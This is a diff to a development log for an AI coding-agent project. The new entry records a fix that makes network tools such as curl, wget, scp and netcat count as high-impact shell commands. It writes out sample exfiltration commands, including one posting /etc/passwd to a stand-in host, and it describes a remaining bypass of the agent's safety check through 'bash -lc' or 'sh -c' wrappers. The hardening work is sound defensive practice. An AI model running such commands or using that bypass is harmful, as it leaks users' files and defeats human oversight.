@@ -1,3 +1,76 @@
+## 2026-10-15 — WP2.1 group 9 closeout: remaining HTTP/egress (NEW-932), one real live gap among several already-closed census items; NEW-933/934/935/936 logged; NEW-753 ledger mis-tag corrected
+
+**Scope:** per explicit instruction ("continue all the way through 3-15
+without stopping"), moved to WP2.1 group 9. project-architect checked
+every HTTP/egress mechanism the census row named — most were already
+closed by groups 4/7/8/WP0.1/WP0.7, or confirmed loopback-only/non-live
+with a formal exclusion record, but one real, live gap matched group 6's
+exact pattern.
+
+**The fix (NEW-932):** `classify_shell_command()` had no check for
+network-client binaries — `curl -X POST -d @file https://x.com/upload`,
+`wget --post-file=f ...`, `scp`, `rsync`, `ssh` all classified `ACT`, not
+`HIGH_IMPACT`, so a `--yolo` session could exfiltrate any locally-
+readable file to an arbitrary remote host with zero confirmation — the
+exact shape of group 6's `termux-sms-send` finding, for network egress
+instead of device actuation. Fixed by mirroring `_is_termux_basename()`'s
+exact style: a named-binary set (`curl`/`wget`/`scp`/`rsync`/`ssh`/
+`sftp`/`ftp`/`telnet`, confirmed installed; `nc`/`ncat`/`netcat`,
+confirmed not installed but included defensively), wired into the same
+two call sites group 6's fix touched. Mutation-discrimination proof
+independently re-verified by code-reviewer: disabling the new function
+makes the yolo-refusal tests fail with `subprocess.run` actually called.
+
+**Code-reviewer's conditional approval required a ledger note (NEW-933),
+written in the same round:** this fix does NOT close the egress class in
+general — `bash -lc 'curl -d @/etc/passwd https://x.com'` and `sh -c`
+with combined flags/extra spacing still bypass `DANGEROUS_PATTERNS`'s
+brittle substring match and classify `ACT`, independently re-verified by
+the coordinator. A different mechanism than `NEW-904`'s wrapper-basename
+tail (interpreter `-c` flags, not basenames) — logged separately, not
+conflated with it.
+
+**Items closed with evidence, no new work needed:** remote CCOS
+dispatch and CRM GET (group 4), cloud inference/planning
+(`CODEY_BACKEND=openrouter` — an operator-set env var at process start,
+not an agent action, already examined and ruled non-live by the
+blueprint's own §23.5.3/§23.6), every loopback-only (127.0.0.1/localhost)
+HTTP call site across `core/`/`tools/`/`restoricon_core/` (9 files
+audited, file:line evidence recorded), daemon/device sockets (group 6),
+WP0.7's Cloudflare tunnel (confirmed still accurately "done" — and
+ingress, not egress, never really group 9's concern).
+
+**Ledger correction (rule 6):** `NEW-753` (a wrong-actor-identity-on-
+reads defect in CCOS CRM fan-out) was mis-tagged "(group 7)" in
+`NEW-910`'s forward-pointer text — group 7's actual closeout never
+touched read-entitlement logic. Corrected to orphaned/unassigned,
+pending Ish's decision on where it belongs; not fixed this round (it's
+an architecture question, not a classification/mediation gap any
+group's pattern closes).
+
+**Two cross-repo findings flagged, not built (NEW-935/936):**
+Codey-Aigentik's Gemini/Vertex AI provider switch (dormant — no API keys
+configured today) sends full customer-conversation content including
+PII to Google's cloud APIs with no per-message audit trail if ever
+activated; and an open product-direction question for Ish on whether
+the blueprint's "external model access to human-model data never by
+default" principle extends to Restoricon business/customer PII (bears
+on both the Aigentik finding and `CODEY_BACKEND=openrouter`'s handling
+of `tool_crm_query` results already in context).
+
+**One more pre-existing test-flakiness finding (NEW-934):** the same
+`tests/test_file_tools.py::TestWriteAndAppendFileActionGateway` order-
+dependent failure already logged once this session (group 3/NEW-855's
+closeout) recurred — same two test names, likely same root cause
+(a stale `AGENT_CONFIG` dict reference after an earlier
+`importlib.reload`). Not re-investigated; flagged as a second
+independent reproduction for whoever picks up the actual fix.
+
+**Commit:** `c1c5b9c`. Files: `tools/shell_tools.py`, `tests/
+test_shell_tools.py`, `NEW_ISSUES.md`.
+
+---
+
 ## 2026-10-15 — WP2.1 group 8 closeout: notification boundary (NEW-925/926/927/928), cross-repo (Codey-OS + Codey-Aigentik); NEW-929/930/931 logged; WP0.2 "done" claim corrected
 
 **Scope:** per explicit instruction ("continue all the way through 3-15
